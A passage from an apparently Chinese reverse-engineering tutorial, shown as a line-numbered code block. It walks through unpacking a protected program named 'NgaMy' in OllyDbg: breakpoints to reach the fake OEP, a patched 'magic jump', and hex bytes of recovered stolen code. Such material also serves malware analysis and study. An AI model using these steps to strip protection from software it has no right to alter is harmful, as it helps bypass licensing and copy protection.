class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、忽略所有异常</span><br><span class=\"line\"></span><br><span class=\"line\">2、打开内存镜像，在.rdata处F2，SHIFT+F9</span><br><span class=\"line\"></span><br><span class=\"line\">没有.rdata用.idata</span><br><span class=\"line\"></span><br><span class=\"line\">3、</span><br><span class=\"line\">0043383D    8B46 0C             mov eax,dword ptr ds:[esi+C]     //中断在这里</span><br><span class=\"line\">00433840    0BC0                or eax,eax</span><br><span class=\"line\">00433842    0F84 25020000       je NgaMy.00433A6D</span><br><span class=\"line\">00433848    8366 0C 00          and dword ptr ds:[esi+C],0</span><br><span class=\"line\">0043384C    03C2                add eax,edx</span><br><span class=\"line\">0043384E    8BD8                mov ebx,eax</span><br><span class=\"line\">00433850    56                  push esi</span><br><span class=\"line\">00433851    57                  push edi</span><br><span class=\"line\">00433852    50                  push eax</span><br><span class=\"line\">00433853    8BF3                mov esi,ebx</span><br><span class=\"line\">00433855    8BFB                mov edi,ebx</span><br><span class=\"line\">00433857    AC                  lods byte ptr ds:[esi]</span><br><span class=\"line\">00433858    C0C0 03             rol al,3</span><br><span class=\"line\">0043385B    AA                  stos byte ptr es:[edi]</span><br><span class=\"line\">0043385C    803F 00             cmp byte ptr ds:[edi],0</span><br><span class=\"line\">0043385F  ^ 75 F6               jnz short NgaMy.00433857</span><br><span class=\"line\">00433861    58                  pop eax</span><br><span class=\"line\">00433862    5F                  pop edi</span><br><span class=\"line\">00433863    5E                  pop esi</span><br><span class=\"line\">00433864    50                  push eax</span><br><span class=\"line\">00433865    FF95 90E24100       call dword ptr ss:[ebp+41E290]</span><br><span class=\"line\">0043386B    0BC0                or eax,eax</span><br><span class=\"line\">0043386D    75 43               jnz short NgaMy.004338B2</span><br><span class=\"line\">0043386F    90                  nop</span><br><span class=\"line\">00433870    90                  nop</span><br><span class=\"line\">00433871    90                  nop</span><br><span class=\"line\">00433872    90                  nop</span><br><span class=\"line\">00433873    53                  push ebx</span><br><span class=\"line\">00433874    FF95 94E24100       call dword ptr ss:[ebp+41E294]</span><br><span class=\"line\">0043387A    0BC0                or eax,eax</span><br><span class=\"line\">0043387C    75 34               jnz short NgaMy.004338B2</span><br><span class=\"line\">0043387E    90                  nop</span><br><span class=\"line\">0043387F    90                  nop</span><br><span class=\"line\">00433880    90                  nop</span><br><span class=\"line\">00433881    90                  nop</span><br><span class=\"line\">00433882    8B95 1FFC4000       mov edx,dword ptr ss:[ebp+40FC1F]</span><br><span class=\"line\">00433888    0195 1D1F4000       add dword ptr ss:[ebp+401F1D],edx</span><br><span class=\"line\">0043388E    0195 211F4000       add dword ptr ss:[ebp+401F21],edx</span><br><span class=\"line\">00433894    6A 00               push 0</span><br><span class=\"line\">00433896    FFB5 1D1F4000       push dword ptr ss:[ebp+401F1D]</span><br><span class=\"line\">0043389C    FFB5 211F4000       push dword ptr ss:[ebp+401F21]</span><br><span class=\"line\">004338A2    6A 00               push 0</span><br><span class=\"line\">004338A4    FF95 9CE24100       call dword ptr ss:[ebp+41E29C]</span><br><span class=\"line\">004338AA    6A 00               push 0</span><br><span class=\"line\">004338AC    FF95 98E24100       call dword ptr ss:[ebp+41E298]</span><br><span class=\"line\">004338B2    60                  pushad</span><br><span class=\"line\">004338B3    2BC0                sub eax,eax</span><br><span class=\"line\">004338B5    8803                mov byte ptr ds:[ebx],al</span><br><span class=\"line\">004338B7    43                  inc ebx</span><br><span class=\"line\">004338B8    3803                cmp byte ptr ds:[ebx],al</span><br><span class=\"line\">004338BA  ^ 75 F9               jnz short NgaMy.004338B5</span><br><span class=\"line\">004338BC    61                  popad</span><br><span class=\"line\">004338BD    8985 17FC4000       mov dword ptr ss:[ebp+40FC17],eax</span><br><span class=\"line\">004338C3    C785 1BFC4000 00000&gt;mov dword ptr ss:[ebp+40FC1B],0</span><br><span class=\"line\">004338CD    8B95 1FFC4000       mov edx,dword ptr ss:[ebp+40FC1F]</span><br><span class=\"line\">004338D3    8B06                mov eax,dword ptr ds:[esi]</span><br><span class=\"line\">004338D5    0BC0                or eax,eax</span><br><span class=\"line\">004338D7    75 07               jnz short NgaMy.004338E0</span><br><span class=\"line\">004338D9    90                  nop</span><br><span class=\"line\">004338DA    90                  nop</span><br><span class=\"line\">004338DB    90                  nop</span><br><span class=\"line\">004338DC    90                  nop</span><br><span class=\"line\">004338DD    8B46 10             mov eax,dword ptr ds:[esi+10]</span><br><span class=\"line\">004338E0    03C2                add eax,edx</span><br><span class=\"line\">004338E2    0385 1BFC4000       add eax,dword ptr ss:[ebp+40FC1B]</span><br><span class=\"line\">004338E8    8B18                mov ebx,dword ptr ds:[eax]</span><br><span class=\"line\">004338EA    8B7E 10             mov edi,dword ptr ds:[esi+10]</span><br><span class=\"line\">004338ED    03FA                add edi,edx</span><br><span class=\"line\">004338EF    03BD 1BFC4000       add edi,dword ptr ss:[ebp+40FC1B]</span><br><span class=\"line\">004338F5    85DB                test ebx,ebx</span><br><span class=\"line\">004338F7    0F84 62010000       je NgaMy.00433A5F</span><br><span class=\"line\">004338FD    F7C3 00000080       test ebx,80000000</span><br><span class=\"line\">00433903    75 1D               jnz short NgaMy.00433922</span><br><span class=\"line\">00433905    90                  nop</span><br><span class=\"line\">00433906    90                  nop</span><br><span class=\"line\">00433907    90                  nop</span><br><span class=\"line\">00433908    90                  nop</span><br><span class=\"line\">00433909    03DA                add ebx,edx</span><br><span class=\"line\">0043390B    83C3 02             add ebx,2</span><br><span class=\"line\">0043390E    56                  push esi</span><br><span class=\"line\">0043390F    57                  push edi</span><br><span class=\"line\">00433910    50                  push eax</span><br><span class=\"line\">00433911    8BF3                mov esi,ebx</span><br><span class=\"line\">00433913    8BFB                mov edi,ebx</span><br><span class=\"line\">00433915    AC                  lods byte ptr ds:[esi]</span><br><span class=\"line\">00433916    C0C0 03             rol al,3</span><br><span class=\"line\">00433919    AA                  stos byte ptr es:[edi]</span><br><span class=\"line\">0043391A    803F 00             cmp byte ptr ds:[edi],0</span><br><span class=\"line\">0043391D  ^ 75 F6               jnz short NgaMy.00433915</span><br><span class=\"line\">0043391F    58                  pop eax</span><br><span class=\"line\">00433920    5F                  pop edi</span><br><span class=\"line\">00433921    5E                  pop esi</span><br><span class=\"line\">00433922    3B9D 1FFC4000       cmp ebx,dword ptr ss:[ebp+40FC1F]</span><br><span class=\"line\">00433928    7C 11               jl short NgaMy.0043393B</span><br><span class=\"line\">0043392A    90                  nop</span><br><span class=\"line\">0043392B    90                  nop</span><br><span class=\"line\">0043392C    90                  nop</span><br><span class=\"line\">0043392D    90                  nop</span><br><span class=\"line\">0043392E    83BD 02244000 00    cmp dword ptr ss:[ebp+402402],0</span><br><span class=\"line\">00433935    75 0A               jnz short NgaMy.00433941</span><br><span class=\"line\">00433937    90                  nop</span><br><span class=\"line\">00433938    90                  nop</span><br><span class=\"line\">00433939    90                  nop</span><br><span class=\"line\">0043393A    90                  nop</span><br><span class=\"line\">0043393B    81E3 FFFFFF0F       and ebx,0FFFFFFF</span><br><span class=\"line\">00433941    53                  push ebx</span><br><span class=\"line\">00433942    FFB5 17FC4000       push dword ptr ss:[ebp+40FC17]</span><br><span class=\"line\">00433948    FF95 8CE24100       call dword ptr ss:[ebp+41E28C]</span><br><span class=\"line\">0043394E    3B9D 1FFC4000       cmp ebx,dword ptr ss:[ebp+40FC1F]</span><br><span class=\"line\">00433954    7C 0F               jl short NgaMy.00433965</span><br><span class=\"line\">00433956    90                  nop</span><br><span class=\"line\">00433957    90                  nop</span><br><span class=\"line\">00433958    90                  nop</span><br><span class=\"line\">00433959    90                  nop</span><br><span class=\"line\">0043395A    60                  pushad</span><br><span class=\"line\">0043395B    2BC0                sub eax,eax</span><br><span class=\"line\">0043395D    8803                mov byte ptr ds:[ebx],al</span><br><span class=\"line\">0043395F    43                  inc ebx</span><br><span class=\"line\">00433960    3803                cmp byte ptr ds:[ebx],al</span><br><span class=\"line\">00433962  ^ 75 F9               jnz short NgaMy.0043395D</span><br><span class=\"line\">00433964    61                  popad</span><br><span class=\"line\">00433965    0BC0                or eax,eax</span><br><span class=\"line\">00433967  ^ 0F84 15FFFFFF       je NgaMy.00433882</span><br><span class=\"line\">0043396D    3B85 9CE24100       cmp eax,dword ptr ss:[ebp+41E29C]          //处理MessageBoxA</span><br><span class=\"line\">00433973    74 20               je short NgaMy.00433995                    //NOP掉</span><br><span class=\"line\">00433975    90                  nop</span><br><span class=\"line\">00433976    90                  nop</span><br><span class=\"line\">00433977    90                  nop</span><br><span class=\"line\">00433978    90                  nop</span><br><span class=\"line\">00433979    3B85 9D014100       cmp eax,dword ptr ss:[ebp+41019D]          //处理RegisterHotKey</span><br><span class=\"line\">0043397F    74 09               je short NgaMy.0043398A                    //NOP掉</span><br><span class=\"line\">00433981    90                  nop</span><br><span class=\"line\">00433982    90                  nop</span><br><span class=\"line\">00433983    90                  nop</span><br><span class=\"line\">00433984    90                  nop</span><br><span class=\"line\">00433985    EB 14               jmp short NgaMy.0043399B</span><br><span class=\"line\">00433987    90                  nop</span><br><span class=\"line\">00433988    90                  nop</span><br><span class=\"line\">00433989    90                  nop</span><br><span class=\"line\">0043398A    8D85 0A024100       lea eax,dword ptr ss:[ebp+41020A]</span><br><span class=\"line\">00433990    EB 09               jmp short NgaMy.0043399B</span><br><span class=\"line\">00433992    90                  nop</span><br><span class=\"line\">00433993    90                  nop</span><br><span class=\"line\">00433994    90                  nop</span><br><span class=\"line\">00433995    8D85 24024100       lea eax,dword ptr ss:[ebp+410224]</span><br><span class=\"line\">0043399B    56                  push esi</span><br><span class=\"line\">0043399C    FFB5 17FC4000       push dword ptr ss:[ebp+40FC17]</span><br><span class=\"line\">004339A2    5E                  pop esi</span><br><span class=\"line\">004339A3    39B5 FA234000       cmp dword ptr ss:[ebp+4023FA],esi</span><br><span class=\"line\">004339A9    74 15               je short NgaMy.004339C0</span><br><span class=\"line\">004339AB    90                  nop</span><br><span class=\"line\">004339AC    90                  nop</span><br><span class=\"line\">004339AD    90                  nop</span><br><span class=\"line\">004339AE    90                  nop</span><br><span class=\"line\">004339AF    39B5 FE234000       cmp dword ptr ss:[ebp+4023FE],esi</span><br><span class=\"line\">004339B5    74 09               je short NgaMy.004339C0</span><br><span class=\"line\">004339B7    90                  nop</span><br><span class=\"line\">004339B8    90                  nop</span><br><span class=\"line\">004339B9    90                  nop</span><br><span class=\"line\">004339BA    90                  nop</span><br><span class=\"line\">004339BB    EB 63               jmp short NgaMy.00433A20</span><br><span class=\"line\">004339BD    90                  nop</span><br><span class=\"line\">004339BE    90                  nop</span><br><span class=\"line\">004339BF    90                  nop</span><br><span class=\"line\">004339C0    80BD D2594100 00    cmp byte ptr ss:[ebp+4159D2],0</span><br><span class=\"line\">004339C7    74 57               je short NgaMy.00433A20                //magic跳，改JMP</span><br><span class=\"line\">004339C9    90                  nop</span><br><span class=\"line\">004339CA    90                  nop</span><br><span class=\"line\">004339CB    90                  nop</span><br><span class=\"line\">004339CC    90                  nop</span><br><span class=\"line\">004339CD    EB 07               jmp short NgaMy.004339D6</span><br><span class=\"line\">004339CF    90                  nop</span><br><span class=\"line\">004339D0    90                  nop</span><br><span class=\"line\">004339D1    90                  nop</span><br><span class=\"line\">004339D2    0100                add dword ptr ds:[eax],eax</span><br><span class=\"line\">004339D4    0000                add byte ptr ds:[eax],al</span><br><span class=\"line\">004339D6    8BB5 E4FC4000       mov esi,dword ptr ss:[ebp+40FCE4]</span><br><span class=\"line\">004339DC    83C6 0D             add esi,0D</span><br><span class=\"line\">004339DF    81EE EA1B4000       sub esi,NgaMy.00401BEA</span><br><span class=\"line\">004339E5    2BF5                sub esi,ebp</span><br><span class=\"line\">004339E7    83FE 00             cmp esi,0</span><br><span class=\"line\">004339EA    7F 34               jg short NgaMy.00433A20</span><br><span class=\"line\">004339EC    90                  nop</span><br><span class=\"line\">004339ED    90                  nop</span><br><span class=\"line\">004339EE    90                  nop</span><br><span class=\"line\">004339EF    90                  nop</span><br><span class=\"line\"></span><br><span class=\"line\">4、在00401000处内存访问断点，SHIFT+F9</span><br><span class=\"line\"></span><br><span class=\"line\">00403D38    68 8C3D4000         push NgaMy.00403D8C             //中断在这里</span><br><span class=\"line\">00403D3D    64:A1 00000000      mov eax,dword ptr fs:[0]</span><br><span class=\"line\">00403D43    50                  push eax</span><br><span class=\"line\">00403D44    8B4424 10           mov eax,dword ptr ss:[esp+10]</span><br><span class=\"line\">00403D48    896C24 10           mov dword ptr ss:[esp+10],ebp</span><br><span class=\"line\">00403D4C    8D6C24 10           lea ebp,dword ptr ss:[esp+10]</span><br><span class=\"line\">00403D50    2BE0                sub esp,eax</span><br><span class=\"line\">00403D52    53                  push ebx</span><br><span class=\"line\">00403D53    56                  push esi</span><br><span class=\"line\">00403D54    57                  push edi</span><br><span class=\"line\">00403D55    8B45 F8             mov eax,dword ptr ss:[ebp-8]</span><br><span class=\"line\">00403D58    8965 E8             mov dword ptr ss:[ebp-18],esp</span><br><span class=\"line\">00403D5B    50                  push eax</span><br><span class=\"line\">00403D5C    8B45 FC             mov eax,dword ptr ss:[ebp-4]</span><br><span class=\"line\">00403D5F    C745 FC FFFFFFFF    mov dword ptr ss:[ebp-4],-1</span><br><span class=\"line\">00403D66    8945 F8             mov dword ptr ss:[ebp-8],eax</span><br><span class=\"line\">00403D69    8D45 F0             lea eax,dword ptr ss:[ebp-10]</span><br><span class=\"line\">00403D6C    64:A3 00000000      mov dword ptr fs:[0],eax</span><br><span class=\"line\">00403D72    C3                  retn                       //运行到这里，然后F8</span><br><span class=\"line\"></span><br><span class=\"line\">5、接着SHIFT+F9</span><br><span class=\"line\"></span><br><span class=\"line\">00405560    3D 00100000         cmp eax,1000                //中断在这里</span><br><span class=\"line\">00405565    73 0E               jnb short NgaMy.00405575</span><br><span class=\"line\">00405567    F7D8                neg eax</span><br><span class=\"line\">00405569    03C4                add eax,esp</span><br><span class=\"line\">0040556B    83C0 04             add eax,4</span><br><span class=\"line\">0040556E    8500                test dword ptr ds:[eax],eax</span><br><span class=\"line\">00405570    94                  xchg eax,esp</span><br><span class=\"line\">00405571    8B00                mov eax,dword ptr ds:[eax]</span><br><span class=\"line\">00405573    50                  push eax</span><br><span class=\"line\">00405574    C3                  retn                    //F4，然后F8</span><br><span class=\"line\"></span><br><span class=\"line\">6。再SHIFT+F9</span><br><span class=\"line\"></span><br><span class=\"line\">0040305C    83F9 02             cmp ecx,2              //中断在这里，这里就是假OEP</span><br><span class=\"line\">0040305F    74 0C               je short NgaMy.0040306D</span><br><span class=\"line\">00403061    81CE 00800000       or esi,8000</span><br><span class=\"line\">00403067    8935 B0DE4000       mov dword ptr ds:[40DEB0],esi</span><br><span class=\"line\">0040306D    C1E0 08             shl eax,8</span><br><span class=\"line\">00403070    03C2                add eax,edx</span><br><span class=\"line\">00403072    A3 B4DE4000         mov dword ptr ds:[40DEB4],eax</span><br><span class=\"line\">00403077    33F6                xor esi,esi</span><br><span class=\"line\">00403079    56                  push esi</span><br><span class=\"line\">0040307A    8B3D B0A04000       mov edi,dword ptr ds:[40A0B0]                   ; kernel32.GetModuleHandleA</span><br><span class=\"line\">00403080    FFD7                call edi</span><br><span class=\"line\">00403082    66:8138 4D5A        cmp word ptr ds:[eax],5A4D</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">7。脱壳，修复</span><br><span class=\"line\"></span><br><span class=\"line\">8、重新载入，在pushad 下用ESP定律</span><br><span class=\"line\"></span><br><span class=\"line\">hr 0012ffa4，SHIFT+F9（5次），来到这里</span><br><span class=\"line\"></span><br><span class=\"line\">004365F4    8915 F5FD4100       mov dword ptr ds:[41FDF5],edx                   ; ntdll.KiFastSystemCallRet</span><br><span class=\"line\">004365FA    FF35 F5FD4100       push dword ptr ds:[41FDF5]</span><br><span class=\"line\">00436600    8F05 2DFE4100       pop dword ptr ds:[41FE2D]</span><br><span class=\"line\">00436606    FF35 2DFE4100       push dword ptr ds:[41FE2D]</span><br><span class=\"line\">0043660C    C70424 60000000     mov dword ptr ss:[esp],60</span><br><span class=\"line\">00436613    56                  push esi</span><br><span class=\"line\">00436614    890C24              mov dword ptr ss:[esp],ecx</span><br><span class=\"line\">00436617    68 8DFD4100         push NgaMy.0041FD8D</span><br><span class=\"line\">0043661C    59                  pop ecx</span><br><span class=\"line\">0043661D    8919                mov dword ptr ds:[ecx],ebx</span><br><span class=\"line\">0043661F    8B0C24              mov ecx,dword ptr ss:[esp]</span><br><span class=\"line\">00436622    8F05 ADFE4100       pop dword ptr ds:[41FEAD]</span><br><span class=\"line\">00436628    FF35 8DFD4100       push dword ptr ds:[41FD8D]</span><br><span class=\"line\">0043662E    C70424 48A24000     mov dword ptr ss:[esp],NgaMy.0040A248</span><br><span class=\"line\">00436635    8905 B9FD4100       mov dword ptr ds:[41FDB9],eax</span><br><span class=\"line\">0043663B    FF35 B9FD4100       push dword ptr ds:[41FDB9]</span><br><span class=\"line\">00436641    90                  nop</span><br><span class=\"line\">00436642    90                  nop</span><br><span class=\"line\">00436643    60                  pushad</span><br><span class=\"line\">00436644    E8 01000000         call NgaMy.0043664A             //F4到这里，然后用ESP</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pushad 上面的就是Stolen Code（NOP可以不复制），复制下来：</span><br><span class=\"line\"></span><br><span class=\"line\">89 15 F5 FD 41 00 FF 35 F5 FD 41 00 8F 05 2D FE 41 00 FF 35 2D FE 41 00 C7 04 24 60 00 00 00 56</span><br><span class=\"line\">89 0C 24 68 8D FD 41 00 59 89 19 8B 0C 24 8F 05 AD FE 41 00 FF 35 8D FD 41 00 C7 04 24 48 A2 40</span><br><span class=\"line\">00 89 05 B9 FD 41 00 FF 35 B9 FD 41 00</span><br><span class=\"line\"></span><br><span class=\"line\">9、hr 0012ff98，F9</span><br><span class=\"line\"></span><br><span class=\"line\">00436F16    68 1DFD4100         push NgaMy.0041FD1D</span><br><span class=\"line\">00436F1B    58                  pop eax</span><br><span class=\"line\">00436F1C    8930                mov dword ptr ds:[eax],esi</span><br><span class=\"line\">00436F1E    8F05 79FC4100       pop dword ptr ds:[41FC79]</span><br><span class=\"line\">00436F24    8B05 79FC4100       mov eax,dword ptr ds:[41FC79]</span><br><span class=\"line\">00436F2A    FF35 1DFD4100       push dword ptr ds:[41FD1D]</span><br><span class=\"line\">00436F30    56                  push esi</span><br><span class=\"line\">00436F31    891C24              mov dword ptr ss:[esp],ebx</span><br><span class=\"line\">00436F34    C70424 383D4000     mov dword ptr ss:[esp],NgaMy.00403D38</span><br><span class=\"line\">00436F3B    8B3424              mov esi,dword ptr ss:[esp]</span><br><span class=\"line\">00436F3E    8F05 A5FE4100       pop dword ptr ds:[41FEA5]</span><br><span class=\"line\">00436F44    8905 01FF4100       mov dword ptr ds:[41FF01],eax</span><br><span class=\"line\">00436F4A    FF35 01FF4100       push dword ptr ds:[41FF01]</span><br><span class=\"line\">00436F50    891C24              mov dword ptr ss:[esp],ebx</span><br><span class=\"line\">00436F53    56                  push esi</span><br><span class=\"line\">00436F54    C70424 45FE4100     mov dword ptr ss:[esp],NgaMy.0041FE45</span><br><span class=\"line\">00436F5B    8F05 31FE4100       pop dword ptr ds:[41FE31]</span><br><span class=\"line\">00436F61    90                  nop</span><br><span class=\"line\">00436F62    90                  nop</span><br><span class=\"line\">00436F63    60                  pushad                </span><br><span class=\"line\">00436F64    E8 01000000         call NgaMy.00436F6A</span><br><span class=\"line\"></span><br><span class=\"line\">都是同样处理！！</span><br><span class=\"line\"></span><br><span class=\"line\">68 1D FD 41 00 58 89 30 8F 05 79 FC 41 00 8B 05 79 FC 41 00 FF 35 1D FD 41 00 56 89 1C 24 C7 04</span><br><span class=\"line\">24 38 3D 40 00 8B 34 24 8F 05 A5 FE 41 00 89 05 01 FF 41 00 FF 35 01 FF 41 00 89 1C 24 56 C7 04</span><br><span class=\"line\">24 45 FE 41 00 8F 05 31 FE 41 00</span><br><span class=\"line\"></span><br><span class=\"line\">10、hr 0012ff94，F9</span><br><span class=\"line\"></span><br><span class=\"line\">0043783F    8B1D 31FE4100       mov ebx,dword ptr ds:[41FE31]                   ; NgaMy.0041FE45</span><br><span class=\"line\">00437845    8933                mov dword ptr ds:[ebx],esi</span><br><span class=\"line\">00437847    8F05 39FC4100       pop dword ptr ds:[41FC39]</span><br><span class=\"line\">0043784D    FF35 39FC4100       push dword ptr ds:[41FC39]</span><br><span class=\"line\">00437853    5B                  pop ebx</span><br><span class=\"line\">00437854    8F05 09FE4100       pop dword ptr ds:[41FE09]</span><br><span class=\"line\">0043785A    891D 21FC4100       mov dword ptr ds:[41FC21],ebx</span><br><span class=\"line\">00437860    FF35 21FC4100       push dword ptr ds:[41FC21]</span><br><span class=\"line\">00437866    C705 19FC4100 09FE4&gt;mov dword ptr ds:[41FC19],NgaMy.0041FE09</span><br><span class=\"line\">00437870    8B1D 19FC4100       mov ebx,dword ptr ds:[41FC19]</span><br><span class=\"line\">00437876    8B33                mov esi,dword ptr ds:[ebx]</span><br><span class=\"line\">00437878    8F05 FDFB4100       pop dword ptr ds:[41FBFD]</span><br><span class=\"line\">0043787E    8B1D FDFB4100       mov ebx,dword ptr ds:[41FBFD]</span><br><span class=\"line\">00437884    FF15 45FE4100       call dword ptr ds:[41FE45]</span><br><span class=\"line\">0043788A    90                  nop</span><br><span class=\"line\">0043788B    90                  nop</span><br><span class=\"line\">0043788C    60                  pushad</span><br><span class=\"line\">0043788D    E8 01000000         call NgaMy.00437893</span><br><span class=\"line\"></span><br><span class=\"line\">8B 1D 31 FE 41 00 89 33 8F 05 39 FC 41 00 FF 35 39 FC 41 00 5B 8F 05 09 FE 41 00 89 1D 21 FC 41</span><br><span class=\"line\">00 FF 35 21 FC 41 00 C7 05 19 FC 41 00 09 FE 41 00 8B 1D 19 FC 41 00 8B 33 8F 05 FD FB 41 00 8B</span><br><span class=\"line\">1D FD FB 41 00 FF 15 45 FE 41 00</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">11、hr 0012ff24，F9（多几次）</span><br><span class=\"line\"></span><br><span class=\"line\">0043813D    890D B1FD4100       mov dword ptr ds:[41FDB1],ecx</span><br><span class=\"line\">00438143    FF35 B1FD4100       push dword ptr ds:[41FDB1]</span><br><span class=\"line\">00438149    8F05 B5FC4100       pop dword ptr ds:[41FCB5]</span><br><span class=\"line\">0043814F    FF35 B5FC4100       push dword ptr ds:[41FCB5]</span><br><span class=\"line\">00438155    56                  push esi</span><br><span class=\"line\">00438156    BE FDFC4100         mov esi,NgaMy.0041FCFD</span><br><span class=\"line\">0043815B    893E                mov dword ptr ds:[esi],edi</span><br><span class=\"line\">0043815D    5E                  pop esi</span><br><span class=\"line\">0043815E    FF35 FDFC4100       push dword ptr ds:[41FCFD]</span><br><span class=\"line\">00438164    68 94000000         push 94</span><br><span class=\"line\">00438169    8F05 E5FC4100       pop dword ptr ds:[41FCE5]</span><br><span class=\"line\">0043816F    FF35 E5FC4100       push dword ptr ds:[41FCE5]</span><br><span class=\"line\">00438175    5F                  pop edi</span><br><span class=\"line\">00438176    893D 3DFE4100       mov dword ptr ds:[41FE3D],edi</span><br><span class=\"line\">0043817C    FF35 3DFE4100       push dword ptr ds:[41FE3D]</span><br><span class=\"line\">00438182    8B0C24              mov ecx,dword ptr ss:[esp]</span><br><span class=\"line\">00438185    8F05 7DFE4100       pop dword ptr ds:[41FE7D]</span><br><span class=\"line\">0043818B    90                  nop</span><br><span class=\"line\">0043818C    90                  nop</span><br><span class=\"line\">0043818D    60                  pushad</span><br><span class=\"line\">0043818E    50                  push eax</span><br><span class=\"line\"></span><br><span class=\"line\">89 0D B1 FD 41 00 FF 35 B1 FD 41 00 8F 05 B5 FC 41 00 FF 35 B5 FC 41 00 56 BE FD FC 41 00 89 3E</span><br><span class=\"line\">5E FF 35 FD FC 41 00 68 94 00 00 00 8F 05 E5 FC 41 00 FF 35 E5 FC 41 00 5F 89 3D 3D FE 41 00 FF</span><br><span class=\"line\">35 3D FE 41 00 8B 0C 24 8F 05 7D FE 41 00</span><br><span class=\"line\"></span><br><span class=\"line\">12、hr 0012ff1c，F9（多试几次）</span><br><span class=\"line\"></span><br><span class=\"line\">00438ACD    8B3C24              mov edi,dword ptr ss:[esp]</span><br><span class=\"line\">00438AD0    8F05 79FD4100       pop dword ptr ds:[41FD79]                       ; ntdll.7C930738</span><br><span class=\"line\">00438AD6    8935 25FC4100       mov dword ptr ds:[41FC25],esi</span><br><span class=\"line\">00438ADC    FF35 25FC4100       push dword ptr ds:[41FC25]</span><br><span class=\"line\">00438AE2    890C24              mov dword ptr ss:[esp],ecx</span><br><span class=\"line\">00438AE5    8B3C24              mov edi,dword ptr ss:[esp]</span><br><span class=\"line\">00438AE8    8F05 B9FC4100       pop dword ptr ds:[41FCB9]</span><br><span class=\"line\">00438AEE    8F05 19FE4100       pop dword ptr ds:[41FE19]</span><br><span class=\"line\">00438AF4    8905 89FD4100       mov dword ptr ds:[41FD89],eax</span><br><span class=\"line\">00438AFA    FF35 89FD4100       push dword ptr ds:[41FD89]</span><br><span class=\"line\">00438B00    57                  push edi</span><br><span class=\"line\">00438B01    BF 19FE4100         mov edi,NgaMy.0041FE19</span><br><span class=\"line\">00438B06    8BC7                mov eax,edi</span><br><span class=\"line\">00438B08    5F                  pop edi</span><br><span class=\"line\">00438B09    8B08                mov ecx,dword ptr ds:[eax]</span><br><span class=\"line\">00438B0B    8F05 95FC4100       pop dword ptr ds:[41FC95]</span><br><span class=\"line\">00438B11    8B05 95FC4100       mov eax,dword ptr ds:[41FC95]</span><br><span class=\"line\">00438B17    53                  push ebx</span><br><span class=\"line\">00438B18    90                  nop</span><br><span class=\"line\">00438B19    90                  nop</span><br><span class=\"line\">00438B1A    60                  pushad</span><br><span class=\"line\">00438B1B    50                  push eax</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">8B 3C 24 8F 05 79 FD 41 00 89 35 25 FC 41 00 FF 35 25 FC 41 00 89 0C 24 8B 3C 24 8F 05 B9 FC 41</span><br><span class=\"line\">00 8F 05 19 FE 41 00 89 05 89 FD 41 00 FF 35 89 FD 41 00 57 BF 19 FE 41 00 8B C7 5F 8B 08 8F 05</span><br><span class=\"line\">95 FC 41 00 8B 05 95 FC 41 00 53</span><br><span class=\"line\"></span><br><span class=\"line\">13、hr 0012ff20，F9</span><br><span class=\"line\"></span><br><span class=\"line\">004393FF    8F05 5DFE4100       pop dword ptr ds:[41FE5D]                       ; 0012FF40</span><br><span class=\"line\">00439405    FF35 5DFE4100       push dword ptr ds:[41FE5D]</span><br><span class=\"line\">0043940B    890C24              mov dword ptr ss:[esp],ecx</span><br><span class=\"line\">0043940E    893D 91FE4100       mov dword ptr ds:[41FE91],edi</span><br><span class=\"line\">00439414    FF35 91FE4100       push dword ptr ds:[41FE91]</span><br><span class=\"line\">0043941A    8F05 81FC4100       pop dword ptr ds:[41FC81]</span><br><span class=\"line\">00439420    891D 89FE4100       mov dword ptr ds:[41FE89],ebx</span><br><span class=\"line\">00439426    FF35 89FE4100       push dword ptr ds:[41FE89]</span><br><span class=\"line\">0043942C    68 81FC4100         push NgaMy.0041FC81</span><br><span class=\"line\">00439431    5B                  pop ebx</span><br><span class=\"line\">00439432    8B0B                mov ecx,dword ptr ds:[ebx]</span><br><span class=\"line\">00439434    8F05 C9FC4100       pop dword ptr ds:[41FCC9]</span><br><span class=\"line\">0043943A    8B1D C9FC4100       mov ebx,dword ptr ds:[41FCC9]</span><br><span class=\"line\">00439440    57                  push edi</span><br><span class=\"line\">00439441    890424              mov dword ptr ss:[esp],eax</span><br><span class=\"line\">00439444    890C24              mov dword ptr ss:[esp],ecx</span><br><span class=\"line\">00439447    8B0424              mov eax,dword ptr ss:[esp]</span><br><span class=\"line\">0043944A    90                  nop</span><br><span class=\"line\">0043944B    90                  